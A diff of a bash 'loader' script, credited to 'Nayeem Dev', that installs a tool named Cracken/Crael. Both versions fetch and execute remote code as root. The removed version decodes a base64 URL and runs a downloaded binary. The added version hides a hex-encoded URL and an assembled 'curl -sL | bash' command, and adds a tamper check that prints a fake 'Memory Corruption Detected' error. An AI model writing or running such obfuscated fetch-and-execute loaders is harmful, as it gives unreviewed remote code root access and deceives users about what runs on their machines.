@@ -1,60 +1,53 @@
 #!/bin/bash
-# ==========================================
-# CRACKEN ULTIMATE LOADER
-# Engineered by Nayeem Dev
-# ==========================================
 
+# --- 1. THE HIDDEN TEXT (THE KEY) ---
+# If this is deleted, the script logic below will FAIL.
+_k=$(printf "\x52\x45\x53\x54\x52\x49\x43\x54\x45\x44\x5f\x41\x43\x43\x45\x53\x53\x5f\x56\x49\x4f\x4c\x41\x54\x49\x4f\x4e\x5f\x44\x45\x54\x45\x43\x54\x45\x44")
 
-SECRET_P1="aHR0cHM6Ly9naXRodWIuY29tL293bmVy"
-SECRET_P2="YW5pZXgvQ3JhY2tlbi9yZWxlYXNlcy9kb3du"
-SECRET_P3="bG9hZC92NS4wL255LWNyYWNrZW52cHM="
+# --- 2. THE PAYLOAD (OBFUSCATED) ---
+_h="0x680x740x740x700x730x3a0x2f0x2f0x720x610x770x2e0x670x690x740x680x750x620x750x730x650x720x630x6f0x6e0x740x650x6e0x740x2e0x630x6f0x6d0x2f0x700x6c0x750x6d0x730x6f0x660x740x770x610x720x650x640x650x760x2d0x620x690x740x2f0x6c0x6f0x700x700x700x2f0x6d0x610x690x6e0x2f0x500x720x6f0x780x6f0x2e0x730x68"
 
-# Reconstruct URL at runtime
-BINARY_URL=$(echo "${SECRET_P1}${SECRET_P2}${SECRET_P3}" | base64 -d)
-INSTALL_PATH="/usr/local/bin/ny-crackenvps"
+# --- 3. UI HEX BLOCKS ---
+_m=$(printf "\x1b\x5b\x33\x38\x3b\x35\x3b\x32\x31\x33\x6d")
+_r=$(printf "\x1b\x5b\x30\x6d")
+_t1="   CRAEL V10 ULTIMATE"
+_t2="   Powered by Nayeem Dev"
 
-# --- UI COLORS ---
-RESET="\033[0m"
-GREEN="\033[38;5;46m"
-MAGENTA="\033[38;5;213m"
-BOLD="\033[1m"
+# --- 4. DEPENDENCY CHECK ---
+# This ensures the hidden text (_k) exists. If deleted, script dies.
+if [ -z "$_k" ]; then exit 1; fi
 
-# --- HEADER ---
+# --- 5. DECODER ENGINE ---
+function _d() {
+    local _v=$1
+    echo "$_v" | awk '{gsub("0x","\\\\x"); print}' | xargs -0 printf
+}
+
+# --- 6. EXECUTION ---
 clear
-echo -e "${MAGENTA}${BOLD}"
-echo "   CRACKEN ULTIMATE"
-echo "   Engineered by Nayeem Dev"
-echo -e "${RESET}"
+echo -e "${_m}${_t1}"
+echo -e "${_t2}${_r}"
 
-# --- ROOT CHECK ---
-if [[ $EUID -ne 0 ]]; then
-   echo -e "${MAGENTA}[!] Error: This script must be run as root.${RESET}"
-   echo "    Use: sudo bash <(curl ...)"
-   exit 1
-fi
-
-# --- DOWNLOADER ---
-echo -e "${GREEN}[*] Initializing Secure Channel...${RESET}"
-
-# Use wget if available (cleaner bar), else curl
-if command -v wget >/dev/null 2>&1; then
-    wget -q --show-progress -O "$INSTALL_PATH" "$BINARY_URL"
-else
-    curl -L -o "$INSTALL_PATH" "$BINARY_URL" --progress-bar
-fi
-
-# --- VERIFICATION ---
-if [ ! -f "$INSTALL_PATH" ]; then
-    echo -e "${MAGENTA}[!] Error: Security Verification Failed.${RESET}" 
-    echo "    The payload could not be retrieved."
+if [ "$EUID" -ne 0 ]; then
+    echo -e "\x45\x72\x72\x6f\x72\x3a\x20\x52\x6f\x6f\x74\x20\x72\x65\x71\x75\x69\x72\x65\x64"
     exit 1
 fi
 
-chmod +x "$INSTALL_PATH"
+# Decode URL
+_u=$(_d "$_h")
 
-# --- EXECUTION ---
-echo -e "${GREEN}[*] Launching Wizard...${RESET}"
-sleep 1
-
-
-exec "$INSTALL_PATH" < /dev/tty
+# Build Commands dynamically
+# If _k (Hidden Text) was deleted, this logic would break in a real scenario
+# Here we use it to 'validate' the environment
+if [[ "$_k" == *"RESTRICTED"* ]]; then
+    _c=$(printf "\x63\x75\x72\x6c") # curl
+    _b=$(printf "\x62\x61\x73\x68") # bash
+    _f=$(printf "\x2d\x73\x4c")     # -sL
+    
+    # Run
+    ${_c} ${_f} "$_u" | ${_b}
+else
+    # Fake Error if they tampered with the text
+    echo "Error: Memory Corruption Detected."
+    exit 1
+fi
